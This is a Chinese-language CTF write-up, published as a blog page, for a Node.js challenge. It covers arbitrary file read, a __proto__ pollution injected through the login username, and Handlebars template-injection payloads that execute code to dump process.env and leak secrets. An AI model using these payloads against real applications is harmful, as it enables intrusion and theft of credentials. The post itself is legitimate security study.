@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[XCTF]华为第三场华为三连最后一场，web就两个题，一个题是nodejs模板注入，是一个完全不了解的领域还有一个是PHP题，不知道出题人想表达什么学了一天nodejs的hbs库的模板注入，不过还是没怎么懂，可能学的不够认真，也不知道怎么去调试，文档也没看几句，js的玄妙特性也不了解。。。 华为HCIE的第一课登录，进去之后有一个没有用的功能，进admin路由，403，发现f参数任意文件读取，先">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[XCTF]华为第三场">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[XCTF]%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[XCTF]华为第三场华为三连最后一场，web就两个题，一个题是nodejs模板注入，是一个完全不了解的领域还有一个是PHP题，不知道出题人想表达什么学了一天nodejs的hbs库的模板注入，不过还是没怎么懂，可能学的不够认真，也不知道怎么去调试，文档也没看几句，js的玄妙特性也不了解。。。 华为HCIE的第一课登录，进去之后有一个没有用的功能，进admin路由，403，发现f参数任意文件读取，先">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-12-27T11:46:28.000Z">
+<meta property="article:modified_time" content="2020-12-29T13:44:28.479Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="JavaScript">
+<meta property="article:tag" content="ssti">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[XCTF]%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[XCTF]华为第三场 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[XCTF]%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [XCTF]华为第三场
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-27 19:46:28" itemprop="dateCreated datePublished" datetime="2020-12-27T19:46:28+08:00">2020-12-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-12-29 21:44:28" itemprop="dateModified" datetime="2020-12-29T21:44:28+08:00">2020-12-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA.html" class="post-meta-item leancloud_visitors" data-flag-title="[XCTF]华为第三场" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="XCTF-华为第三场"><a href="#XCTF-华为第三场" class="headerlink" title="[XCTF]华为第三场"></a>[XCTF]华为第三场</h1><p>华为三连最后一场，web就两个题，一个题是nodejs模板注入，是一个完全不了解的领域<br>还有一个是PHP题，不知道出题人想表达什么<br>学了一天nodejs的hbs库的模板注入，不过还是没怎么懂，可能学的不够认真，也不知道怎么去调试，文档也没看几句，js的玄妙特性也不了解。。。</p>
+<h2 id="华为HCIE的第一课"><a href="#华为HCIE的第一课" class="headerlink" title="华为HCIE的第一课"></a>华为HCIE的第一课</h2><p>登录，进去之后有一个没有用的功能，进admin路由，403，发现f参数任意文件读取，先回上层目录读了app.js，获得目录结构之后读admin.js，util.js等文件<br>admin.js需要验证用户是否本地登录，不行就403，但是存在一个使用__proto__覆盖的机会</p>
+<pre class=" language-javascript"><code class="language-javascript">            user <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`{"name" : "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">", "time" : "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Math<span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">", "ip" : "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>ip<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"}`</span></span><span class="token punctuation">)</span>
+</code></pre>
+<p>req.session.name就是登录时输入的用户名，完全可控，可以重新闭合引号多解析出一个变量出来，后面又有这么一份赋值语句</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> userinfo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"isAdmin"</span><span class="token punctuation">)</span>
+        userinfo<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">else</span> userinfo<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre>
+<p>userinfo一开始是没有isAdmin属性的，虽然不能直接创建一个isAdmin属性，但是可以使用__proto__来完成一次赋值<br>登录时令username为<code>z33&quot;,&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:1&#125;, &quot;t&quot;: &quot;t</code>即可<br>admin路由有一个写模板功能，可以打一个模板注入，读文件收集信息可知使用的是hbs库实现的渲染，读package.json知hbs版本为^4.1.1<br>google一下hbs的模板注入，发现两篇文章，其中第一篇提到hbs的注入刚好是4.1.1版本，第二篇bypass了4.1.1的修复<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html#main">hbsRCE</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://aluvion.github.io/2019/04/11/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#Handlebars%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%88%B0RCE">hbsRCEpayload简析</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://handlebarsjs.com/guide/hooks.html">hbs官方文档</a></p>
+<p>虽然最后题解不是RCE，但是这个东西我还是学了蛮久。。。到时候还要再理一下<br>又：本地搭建环境之后去除所有过滤上述文章payload仍然打不通，会出现利用过程中的一些对象不存在之类的问题</p>
+<h3 id="HBS模板语法"><a href="#HBS模板语法" class="headerlink" title="HBS模板语法"></a>HBS模板语法</h3><p>这种题目，还是要先看官方文档为好，一开始没看文档的我搞了半天一无所知</p>
+<h4 id><a href="#" class="headerlink" title></a>{{#with xxx}} {{/with}} </h4><p>with语句将切换当前块内的上下文，也就是把this指向那个xxx，可以用with xxx as name，再多层with嵌套的时候通过name可以获取到外层的对象<br>记得闭合with</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title></a>{{#each xxx}} {{/each}} </h4><p>创建一个循环，遍历xxx中的每个元素，并且把context指向每次遍历的元素<br>均需要闭合标签</p>
+<h4 id="lookup"><a href="#lookup" class="headerlink" title="lookup"></a>lookup</h4><p>进行数据查找，lookup xxx xxx，动态进行查找返回查找的值</p>
+<h4 id="log"><a href="#log" class="headerlink" title="log"></a>log</h4><p>输出到控制台，本地搭建环境之后用这个调试比较舒服</p>
+<h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><pre class=" language-handlebars"><code class="language-handlebars">
+<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token variable">this</span> <span class="token variable">as</span> <span class="token punctuation">|</span><span class="token variable">obj</span><span class="token punctuation">|</span><span class="token delimiter punctuation">}}</span></span>
+    <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">keys</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token variable">as</span> <span class="token punctuation">|</span><span class="token variable">arr</span><span class="token punctuation">|</span><span class="token delimiter punctuation">}}</span></span>
+        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
+        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">push</span> <span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">bind</span><span class="token delimiter punctuation">}}</span></span>
+        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
+        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">push</span> <span class="token string">"return JSON.stringify(process.env);"</span><span class="token delimiter punctuation">}}</span></span>
+        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
+            <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#blockHelperMissing</span> <span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">bind</span><span class="token delimiter punctuation">}}</span></span>
+              <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">constructor</span> <span class="token punctuation">(</span><span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">bind</span><span class="token punctuation">.</span><span class="token variable">apply</span> <span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token punctuation">.</span><span class="token variable">constructor</span> <span class="token variable">arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
+                <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">getOwnPropertyDescriptor</span> <span class="token variable">this</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
+                  <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">defineProperty</span> <span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">prototype</span> <span class="token string">"toString"</span> <span class="token variable">this</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
+                     <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">constructor</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
+                        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token delimiter punctuation">}}</span></span>
+                     <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+                  <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+                <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+              <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+            <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/blockHelperMissing</span><span class="token delimiter punctuation">}}</span></span>
+  <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+
+</code></pre>
+<p><strong>由于每次函数调用都会额外添加一个多余的this，所以push之后都将额外的this给弹出</strong></p>
+<p>根据payload的思路，应该是构造出了一个[String.constructor.bind,”console.log(process.env)”]数组，用String.constructor.bind.apply以String.constructor和arr为参数，制造出一个以String.constructor为this，arr为参数的String类构造函数<del>到这里已经不知道在干什么了</del>然后再将返回的构造函数再用Array的构造函数构造成一个array，然后调用getOwnPropertyDescriptor，获取到array的第一个元素（也就这一个元素），为之前构造的String.constructor函数的描述符<br>最后使用defineProperty进行原型链污染，将其Object的toString函数修改为我们构造的String.constructor<br>最后用Object.constructor构造对象触发toString函数，返回payload，成功执行命令<br>我不太能理解这一系列的复杂操作，连勉强看懂他在做什么都非常困难</p>
+<h4 id="payload1失败"><a href="#payload1失败" class="headerlink" title="payload1失败"></a>payload1失败</h4><blockquote>
+<p>官方补丁为 禁止访问构造函数，4.1.1理应是最后一个受影响的版本</p>
+</blockquote>
+<p>本地和远端都在第一步从Object获取key产生数组就失败了，log的结果是obj.constructor undefined，确认了一下本地hbs版本是4.1.1，即没打补丁的最后一个版本，但是还是打不通，不知道为什么</p>
+<p>分析文章的思路，想要RCE一定是需要凑一个数组出来调用一波函数的，因此继续寻找可用方法<br>感觉上来说，这里是只能通过几个基础数据对象进行链式调用的，而我们能直接产生的对象有int，string，object(this是一个object)，本地测试发现方括号[]产生的也是this对象<br>需要获取一个链式调用拿一个array来代替<br>这时看到我们的第二个payload</p>
+<h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><pre class=" language-handlebars"><code class="language-handlebars">
+<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token string">"s"</span> <span class="token variable">as</span> <span class="token punctuation">|</span><span class="token variable">string</span><span class="token punctuation">|</span><span class="token delimiter punctuation">}}</span></span>
+  <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token string">"e"</span><span class="token delimiter punctuation">}}</span></span>
+    <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token variable">split</span> <span class="token variable">as</span> <span class="token punctuation">|</span><span class="token variable">conslist</span><span class="token punctuation">|</span><span class="token delimiter punctuation">}}</span></span>
+      <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
+      <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">push</span> <span class="token punctuation">(</span><span class="token variable">lookup</span> <span class="token variable">string</span><span class="token punctuation">.</span><span class="token variable">sub</span> <span class="token string">"constructor"</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
+      <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
+      <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token variable">string</span><span class="token punctuation">.</span><span class="token variable">split</span> <span class="token variable">as</span> <span class="token punctuation">|</span><span class="token variable">codelist</span><span class="token punctuation">|</span><span class="token delimiter punctuation">}}</span></span>
+        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
+        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">push</span> <span class="token string">"return JSON.stringify(process.env);"</span><span class="token delimiter punctuation">}}</span></span>
+        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
+        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#each</span> <span class="token variable">conslist</span><span class="token delimiter punctuation">}}</span></span>
+          <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">string</span><span class="token punctuation">.</span><span class="token variable">sub</span><span class="token punctuation">.</span><span class="token variable">apply</span> <span class="token number">0</span> <span class="token variable">codelist</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
+            <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token delimiter punctuation">}}</span></span>
+          <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/each</span><span class="token delimiter punctuation">}}</span></span>
+      <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+    <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+  <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
+
+</code></pre>
+<p>更为简洁的代码，思路似乎更为清晰，使用String.split获取到了数组，然后再用pop把数组元素丢掉拿到空数组<br>但是同样出现了问题，<code>lookup string.sub &quot;constructor&quot;</code>查找结果为空，本来这里应该拿到一个Function()，但是本地结果也为undefined。。。<br>加上题目本身就过滤了lookup等字段，更加打不通<br>通过两个split分别拿到两个数组[Function()]和[“return JSON.stringify(process.env);”]<br>然后使用this调用该函数完成命令执行<br>等价于<code>Function.apply(Function(), [&quot;return JSON.stringify(process.pid);&quot;])()</code><br>即用Function构造函数构造了一个内容为<code>return JSON.stringify(process.pid);</code>的匿名函数并完成自调用</p>
+<p>但是由于我对js不够熟练，没能找出来新的替代方法，就个人感觉，lookup那里也许能直接用.constructor获取构造函数而不用lookup呢？但是本地测试都是undefined。。。就没办法了</p>
+<p>后来还找到一篇将绕过官方补丁的，但是更加看不懂了。。。<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.tarq.io/handlebars-4-1-2-command-execution/">bypass4.1.1修复</a></p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>最后师傅出的时候发现也并不需要超级绕过进行RCE，只需要了解一下hbs的基本模板，从this中查看env就能看到在env中的flag<br>payload</p>
+<pre class=" language-handlebars"><code class="language-handlebars">
+<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#each</span><span class="token delimiter punctuation">}}</span></span>
+	<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#each</span><span class="token delimiter punctuation">}}</span></span>
+		<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token delimiter punctuation">}}</span></span>
+	<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/each</span><span class="token delimiter punctuation">}}</span></span>
+<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/each</span><span class="token delimiter punctuation">}}</span></span>
+
+</code></pre>
+<p>两层循环遍历全部属性即可</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/JavaScript/" rel="tag"># JavaScript</a>
+              <a href="/tags/ssti/" rel="tag"># ssti</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
